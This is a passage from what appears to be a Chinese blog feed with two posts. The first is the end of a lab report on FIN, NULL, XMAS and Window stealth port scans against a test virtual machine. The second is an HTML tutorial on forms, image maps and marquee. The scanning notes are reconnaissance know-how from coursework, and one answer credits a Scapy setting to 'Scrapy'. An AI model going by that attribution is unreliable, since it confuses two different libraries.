FIN测试虚拟机</p><ol start="5"><li>NULL</li></ol><p>•     结果展示：</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922172001270.png" alt="image-20230922172001270"></p><p>​图 35　NULL测试虚拟机</p><p>6.XMAS</p><p>•     结果展示：</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922172018268.png" alt="image-20230922172018268"></p><p>​图 36　XMAS测试虚拟机</p><p>7.Window</p><p>•     结果展示：</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922172035070.png" alt="image-20230922172035070"></p><p>​图 37　Window测试虚拟机</p><p><img src="/2023/09/21/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/image-20230922172045295.png" alt="image-20230922172045295"></p><p>​图 38　wires hark抓包显示</p><p>8.结果解释</p><p>通过与第二个任务中本机Windows系统端口扫描结果比对，能够发现Linux除了Window扫描外，使用其他的隐秘扫描方式的结果均与理论相符，可以推测Linux是符合RFC规则的，而本机操作系统Win10专业版则有自己的规则。</p><p>针对window扫描在两个操作系统均失效的情况，我只能通过抓包来展示回复包的信息。发现测试的两个操作系统在使用Window扫描时，无论端口是否开放，目标主机均会回复一个flag为R的包，且Win均为0，不会被过滤。</p><p><strong>（1）</strong> <strong>回答问题：样例程序中“conf.L3socket&#x3D;L3RawSocket”的作用是什么？</strong></p><ol><li>前提解释</li></ol><p>Scrapy是一种高级的网络框架，它本身是将一些底层的网络数据包操作封装起来了，一般使用时，不需要直接通过套接字编程。</p><ol start="2"><li>代码作用</li></ol><p>​     i.    属于——配置超级套接字（Scrapy官方文档解释）</p><p>​    ii.    表示通过 libpcap 接收&#x2F;发送 L3 数据包</p><p>   iii.    深入理解：这样的配置，可以手动指定原始套接字，当需要构造一些特定类型的网络数据包来进行探测活动时，这样的用法就很有必要。</p>]]></content>
      
      
      <categories>
          
          <category> 安全知识 </category>
          
          <category> 网络攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 端口扫描 半连接 scrapy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>html深入</title>
      <link href="/2023/09/20/html%E6%B7%B1%E5%85%A5/"/>
      <url>/2023/09/20/html%E6%B7%B1%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="一、表单"><a href="#一、表单" class="headerlink" title="一、表单"></a>一、表单</h2><ul><li><p>提交方式：【get，post】</p><ul><li>最直观的区别就是GET把参数包含在URL中，POST通过request body传递参数。</li><li>GET不安全，相较而言POST安全一点</li></ul></li><li><p>形式：</p></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">First name: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;firstname&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">Last name: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;lastname&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>表单标签汇总</p><p>- </p><ul><li><table><thead><tr><th align="center">标签</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">form</td><td align="left">定义供用户输入的表单</td></tr><tr><td align="center">input</td><td align="left">定义输入域</td></tr><tr><td align="center">textarea</td><td align="left">定义文本域 (一个多行的输入控件)</td></tr><tr><td align="center">label</td><td align="left">定义了 input元素的标签，一般为输入标题</td></tr><tr><td align="center">fieldstet</td><td align="left">定义了一组相关的表单元素，并使用外框包含起来,说明语义，更加友好</td></tr><tr><td align="center">legend</td><td align="left">定义了 fieldset 元素的标题</td></tr><tr><td align="center">select</td><td align="left">定义了下拉选项列表</td></tr><tr><td align="center">opgroup</td><td align="left">定义选项组</td></tr><tr><td align="center">option</td><td align="left">定义下拉列表中的选项</td></tr><tr><td align="center">button</td><td align="left">定义一个点击按钮</td></tr><tr><td align="center">datalist <strong>New</strong></td><td align="left">指定一个预先定义的输入控件选项列表</td></tr><tr><td align="center">keygen <strong>New</strong></td><td align="left">定义了表单的密钥对生成器字段</td></tr><tr><td align="center">output <strong>New</strong></td><td align="left">定义一个计算结果</td></tr></tbody></table></li></ul></li><li><p>表单标签使用案例</p><p>- </p>  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>表单标签使用案例<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>这部分内容分两个部分介绍<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>1.  基本标签<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>2. 表单和服务器的交互（Python Flask 构建框架）<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        表单是接受用户输入，然后将输入传递给服务器，然后服务器根据用户的需求产生个性化输入的控件。</span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>表单控件的使用<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 基本结构 form开始和结束标签  --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- action指定数据交给服务器中那个程序处理 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- method规定使用什么方法传递数据：get  or post --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- autocomplete 用于启用自动填充 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;&quot;</span> <span class="attr">autocomplete</span>=<span class="string">&quot;on or off&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- input插件用于接受用户的输入，包含了多种输入插件 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--  name=&quot;必须&quot; type=&quot;text&quot; size=&quot;数字&quot; placeholder=&quot;提示信息&quot; --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 关于label 要明白for的作用 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;user&quot;</span>&gt;</span>姓名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入用户名&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;pass&quot;</span>&gt;</span>密码：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pass&quot;</span> <span class="attr">id</span>=<span class="string">&quot;pass&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入密码&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 单选：radio --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;male&quot;</span>&gt;</span>性别：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">value</span>=<span class="string">&quot;male&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">id</span>=<span class="string">&quot;male&quot;</span>&gt;</span>男性</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">value</span>=<span class="string">&quot;female&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">id</span>=<span class="string">&quot;female&quot;</span>&gt;</span>女性</span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 多选:checkbox  --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;sports&quot;</span>&gt;</span>爱好：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;sports&quot;</span> <span class="attr">name</span>=<span class="string">&quot;fav&quot;</span> <span class="attr">id</span>=<span class="string">&quot;sports&quot;</span>&gt;</span>运动</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;reading&quot;</span> <span class="attr">name</span>=<span class="string">&quot;fav&quot;</span> <span class="attr">id</span>=<span class="string">&quot;reading&quot;</span>&gt;</span>读书</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;delicacy&quot;</span> <span class="attr">name</span>=<span class="string">&quot;fav&quot;</span> <span class="attr">id</span>=<span class="string">&quot;delicacy&quot;</span>&gt;</span>美食</span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 文件 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>上传附件：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 命令按钮：四种按钮：命令，提交，置位，图像按钮 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;命令&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;reset&quot;</span> <span class="attr">value</span>=<span class="string">&quot;清空&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;image&quot;</span> <span class="attr">src</span>=<span class="string">&quot;./3rd class/img/goodbye.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;图形按钮&quot;</span> <span class="attr">width</span>=<span class="string">&quot;2%&quot;</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">&lt;!-- html5 提供的新类型 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;url&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;color&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;date&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;time&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;datetime&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;range&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;search&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 多行文本框：textarea 属性：names, rows，cols,values,maxlength --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;selfdescr&quot;</span>&gt;</span>个人描述：<span class="tag">&lt;/<span class="name">label</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;selfdescr&quot;</span> <span class="attr">id</span>=<span class="string">&quot;selfdescr&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;30&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;10&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 组合框：fieldset:将一组相关的输入集合在一起 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 组合框的标题：legend:组合框的标题 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">fieldset</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">legend</span>&gt;</span>健康信息：<span class="tag">&lt;/<span class="name">legend</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;name&quot;</span>&gt;</span>姓名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">id</span>=<span class="string">&quot;name&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;sex&quot;</span>&gt;</span>性别:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">id</span>=<span class="string">&quot;sex&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;height&quot;</span>&gt;</span>身高：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;height&quot;</span> <span class="attr">id</span>=<span class="string">&quot;height&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;weight&quot;</span>&gt;</span>体重：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;weight&quot;</span> <span class="attr">id</span>=<span class="string">&quot;weight&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;/<span class="name">fieldset</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 下拉列表：select --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>下拉列表有两种形式：差别就是属性中的multiple<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>1. 单项下拉列表<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span>2. 双向下拉列表<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>单向下拉列表<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;fruid&quot;</span> <span class="attr">id</span>=<span class="string">&quot;fruid&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;apple&quot;</span>&gt;</span>apple<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;pear&quot;</span>&gt;</span>pear<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;watermelon&quot;</span>&gt;</span>watermelon<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>多向下拉列表<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;fav&quot;</span> <span class="attr">id</span>=<span class="string">&quot;fav&quot;</span> <span class="attr">multiple</span>=<span class="string">&quot;multiple&quot;</span> <span class="attr">size</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;tr&quot;</span>&gt;</span>travel<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;delicacy&quot;</span>&gt;</span>delicacy<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;sp&quot;</span>&gt;</span>sports<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;music&quot;</span>&gt;</span>music<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;reading&quot;</span>&gt;</span>reading<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;movie&quot;</span>&gt;</span>movie<span class="tag">&lt;/<span class="name">option</span>&gt;</span>    </span><br><span class="line">        <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>多向下拉分组列表<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;fav&quot;</span> <span class="attr">id</span>=<span class="string">&quot;fav&quot;</span> <span class="attr">multiple</span>=<span class="string">&quot;multiple&quot;</span> <span class="attr">size</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">optgroup</span> <span class="attr">label</span>=<span class="string">&quot;户外运动&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;tr&quot;</span>&gt;</span>travel<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;sp&quot;</span>&gt;</span>sports<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;movie&quot;</span>&gt;</span>movie<span class="tag">&lt;/<span class="name">option</span>&gt;</span>    </span><br><span class="line">            <span class="tag">&lt;/<span class="name">optgroup</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">optgroup</span> <span class="attr">label</span>=<span class="string">&quot;室内运动&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;delicacy&quot;</span>&gt;</span>delicacy<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;music&quot;</span>&gt;</span>music<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;reading&quot;</span>&gt;</span>reading<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">optgroup</span>&gt;</span>    </span><br><span class="line">        <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="二、value、id、name详解"><a href="#二、value、id、name详解" class="headerlink" title="二、value、id、name详解"></a>二、value、id、name详解</h2><ul><li>name是控件的名称 ，value是控件的值， id是控件的身份标志。</li><li>value：<ul><li><strong>对于 “button”、“reset”、“submit” 类型 - 定义按钮上的文本</strong></li><li><strong>对于 “text”、“password”、“hidden” 类型 - 定义输入字段的初始（默认）值</strong></li><li><strong>对于 “checkbox”、“radio”、“image” 类型 - 定义与 input 元素相关的值，当提交表单时该值会发送到表单的 action URL。</strong></li></ul></li></ul><blockquote><p>注意：value 属性对于 ＜input type&#x3D;”checkbox”＞和 ＜input type&#x3D;”radio”＞ 是必需的。<br>注意：value 属性不适用于 ＜input type&#x3D;”file”＞</p></blockquote><ul><li><p>＜input＞<strong>name</strong> 属性</p><ul><li><p><strong>name 属性规定 ＜input＞元素的名称。<br>name 属性用于在 JavaScript 中引用元素，或者在表单提交后引用表单数据。</strong></p><blockquote><p>注意：只有设置了 name 属性的表单元素才能在提交表单时传递它们的值。</p></blockquote></li></ul></li><li><p>总结：</p><ul><li>name主要是表单元素里才有的属性。通过js的document.表单名称.文本框.value来获取文本框的值，其中的表单名称和文本框名称指的是name,</li><li>而非表单元素例如div，span等是没有name属性的，而id属性是任何一个HTML元素都会有的。当你需要用js获取非表单元素对象是就得用document.getElementByIdx(“id”)</li><li>value用于数据库传值，name用来标识</li></ul></li></ul><h2 id="三、地图热点"><a href="#三、地图热点" class="headerlink" title="三、地图热点"></a>三、地图热点</h2><ul><li><p>用坐标来选定图像的区域并关联超链接</p></li><li><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>地图和地图热点演示<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;./img/animal.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;9 grid picture&quot;</span> <span class="attr">usemap</span>=<span class="string">&quot;#ninegrid&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">map</span> <span class="attr">name</span>=<span class="string">&quot;ninegrid&quot;</span> <span class="attr">id</span>=<span class="string">&quot;ninegrid&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">&quot;rect&quot;</span> <span class="attr">coords</span>=<span class="string">&quot;0,0,120,120&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://www.scu.edu.cn&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">&quot;rect&quot;</span> <span class="attr">coords</span>=<span class="string">&quot;120,0,240,120&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://www.uestc.edu.cn&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">&quot;rect&quot;</span> <span class="attr">coords</span>=<span class="string">&quot;240,0,360,120&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://www.swjtu.edu.cn/&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">area</span> <span class="attr">shape</span>=<span class="string">&quot;rect&quot;</span> <span class="attr">coords</span>=<span class="string">&quot;360,0,480,120&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://www.swufe.edu.cn/&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="四、走马丁（弹幕）"><a href="#四、走马丁（弹幕）" class="headerlink" title="四、走马丁（弹幕）"></a>四、走马丁（弹幕）</h2><p>- </p>  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>基本效果<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">marquee</span> <span class="attr">behavior</span>=<span class="string">&quot;&quot;</span> <span class="attr">direction</span>=<span class="string">&quot;&quot;</span>&gt;</span>我是基础的走马灯！<span class="tag">&lt;/<span class="name">marquee</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>behavior控制走马灯运动效果，默认循环滚动（alternate）<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">marquee</span> <span class="attr">behavior</span>=<span class="string">&quot;slide&quot;</span> <span class="attr">direction</span>=<span class="string">&quot;&quot;</span>&gt;</span>我幻灯片模式，滚动到边停<span class="tag">&lt;/<span class="name">marquee</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>direction 控制方向（默认left,方向从右边到左）<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">marquee</span> <span class="attr">behavior</span>=<span class="string">&quot;&quot;</span> <span class="attr">direction</span>=<span 